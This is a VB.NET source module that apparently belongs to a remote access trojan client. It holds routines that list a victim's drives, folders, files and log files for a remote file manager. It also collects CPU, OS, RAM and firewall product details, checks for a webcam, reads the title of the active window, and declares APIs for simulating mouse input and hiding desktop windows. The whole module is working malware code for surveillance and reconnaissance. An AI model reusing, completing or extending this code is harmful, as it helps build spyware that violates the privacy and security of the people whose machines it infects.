Imports System.Diagnostics
Imports System.Management
Imports System.Net, System.Net.Sockets, System.IO, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32
Module e

    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                Case 5
                    allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
            End Select
        Next
        Return allDrives
    End Function
    Public Function readtext(ByVal l As String) As String
        Return IO.File.ReadAllText(l)
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function
    Public Function getlog(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.log*")
            files += f.Name & "|"
        Next
        Return files
    End Function
#Region "GET INFO"
    Dim cpu As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString
    Public Function Cam() As Boolean
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return True
                End If
            Next
        Catch ex As Exception
        End Try
        Return False
    End Function
    Dim os As String = My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
    Public Function GenerateOperatingSystem() As String
        Dim os As System.OperatingSystem = System.Environment.OSVersion
        Dim osName As String
        osName += " SP"
        Dim k As String() = Split(Environment.OSVersion.ServicePack, " ")
        If k.Length = 1 Then
            osName &= "0"
        End If
        osName &= k(k.Length - 1)
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString.Contains("x86") Then
            osName += " x86"
        Else
            osName += " x64"
        End If
        Return osName
    End Function
    Function GetFirewall() As String
        Dim str As String = Nothing
        Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
        Dim instances As ManagementObjectCollection = searcher.[Get]()
        For Each queryObj As ManagementObject In instances
            str = queryObj("displayName").ToString()
        Next
        Return str
        searcher.Dispose()
    End Function
    Function RAM() As String
        Dim x As String = ""

        Dim PH As Long = Val(My.Computer.Info.TotalPhysicalMemory)
        If PH > 1073741824 Then
            x = (PH / 1073741824).ToString
            x = x.Remove(4, x.Length - 4) + " GB"
        ElseIf PH > 1048576 Then
            x = (PH / 1048576).ToString
            x = x.Remove(4, x.Length - 4) + " Mo"
        End If
        Return x
    End Function
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Public Function FR() As String
        Try
            Return CType(LO, IO.FileInfo).LastWriteTime.ToString("yyyy-MM-dd")
        Catch ex As Exception
            Return "unknown"
        End Try
    End Function
#End Region
    Public Function GetSystemRAMSize() As Double
        Try
            Dim RAM_Size As Double = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
            Return FormatNumber(RAM_Size, 2)

        Catch : End Try
    End Function
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
    ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
    ByVal cbVer As Integer) As Boolean
    Public Function checkcam() As String
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return "x"
                End If
            Next
        Catch ex As Exception
        End Try
        Return "-"
    End Function
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Public Function ACT() As String
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ""
            End If
            Dim w As Integer
            w = GetWindowTextLength(h)
            Dim t As String = StrDup(w + 1, "*")
            GetWindowText(h, t, w + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return t
            Else
                Try
                    Return Diagnostics.Process.GetProcessById(pid).MainWindowTitle()
                Catch ex As Exception
                    Return t
                End Try
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function

#Region "Disktop Icons"
    Public Enum SW As Int32
        Hide = 0
        Normal = 1
        ShowMinimized = 2
        ShowMaximized = 3
        ShowNoActivate = 4
        Show = 5
        Minimize = 6
        ShowMinNoActive = 7
        ShowNA = 8
        Restore = 9
        ShowDefault = 10
        ForceMinimize = 11
        Max = 11
    End Enum
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function FindWindow(ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr
    End Function
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function GetWindow(ByVal hWnd As IntPtr, ByVal uCmd As UInteger) As IntPtr
    End Function
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function IsWindowVisible(ByVal hwnd As IntPtr) As Boolean
    End Function
    Public Enum GetWindowCmd As UInteger
        GW_HWNDFIRST = 0
        GW_HWNDLAST = 1
        GW_HWNDNEXT = 2
        GW_HWNDPREV = 3
        GW_OWNER = 4
        GW_CHILD = 5
        GW_ENABLEDPOPUP = 6
    End Enum
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function ShowWindow(ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Boolean
    End Function
#End Region
End Module
